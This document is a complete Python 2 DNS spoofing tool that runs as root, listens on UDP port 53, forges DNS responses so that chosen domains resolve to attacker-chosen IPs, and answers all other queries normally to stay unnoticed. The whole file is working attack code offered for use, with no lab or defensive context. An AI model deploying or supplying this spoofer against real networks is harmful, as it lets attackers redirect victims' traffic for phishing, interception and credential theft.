#!/usr/bin/python

import sys
import os
import socket
import argparse

###################################################################################################

if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

###################################################################################################

def resolve_dn(domain_name):
    try:
        dataip = socket.gethostbyname_ex(domain_name)
        ip = str(dataip[2][0]).strip("[] '")
        print "Resolving Address [%s] -> [%s]" % (domain_name, ip)
        return ip
    except socket.gaierror:
        print "Error! Resolving Domain [%s]!" % (domain_name)
        return "1.1.1.1"

###################################################################################################

class DNSQuery:

    ###################################################################################################

    def __init__(self, data):
        self.data = data
        self.dominio = ''
        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini = 12
            lon = ord(data[ini])
            while lon != 0:
                self.dominio += data[ini + 1: ini + lon + 1] + '.'
                ini += lon + 1
                lon = ord(data[ini])

    ###################################################################################################

    def respuesta(self, block):
        packet = ''
        for domain in block:
            if self.dominio[:-1] == domain:
                packet += self.data[:2] + "\x81\x80"
                packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'                  # Questions and Answers Counts
                packet += self.data[12:]                                                        # Original Domain Name Question
                packet += '\xc0\x0c'                                                            # Pointer to domain name
                packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'                            # Response type, ttl and resource data length -> 4 bytes
                packet += str.join('', map(lambda x: chr(int(x)), block[domain].split('.')))    # 4bytes of IP
                print 'Spoofing: [%s] -> [%s]' % (self.dominio[:-1], block[domain])
                return packet

        self.ip = resolve_dn(self.dominio[:-1])
        packet += self.data[:2] + "\x81\x80"
        packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'          # Questions and Answers Counts
        packet += self.data[12:]                                                # Original Domain Name Question
        packet += '\xc0\x0c'                                                    # Pointer to domain name
        packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'                    # Response type, ttl and resource data length -> 4 bytes
        packet += str.join('', map(lambda x: chr(int(x)), self.ip.split('.')))   # 4bytes of IP
        print 'Normal Request of: [%s] -> [%s]' % (self.dominio[:-1], self.ip)
        return packet

###################################################################################################

def main(argv):
    block = {}

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', dest='target_array', action='append', required=True)
    ns = parser.parse_args()

    if not len(ns.target_array):
        print 'dns-spoofer.py -t <domain>,<target>'

    for domain, target in [i.split(',') for i in ns.target_array]:
        if domain and target:
            print 'Spoofing Domain: ' + domain + " -> Target is: " + target
            block[domain] = resolve_dn(target)
            print "\n"

    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print "Staring Script....\n"

    try:
        while 1:
            data, addr = udps.recvfrom(1024)
            p = DNSQuery(data)
            udps.sendto(p.respuesta(block), addr)
    except KeyboardInterrupt:
        udps.close()

    print '\n\nUser Requested ctrl+c! \nClosing Connections -> [OK] \n'

if __name__ == "__main__":
    main(sys.argv[1:])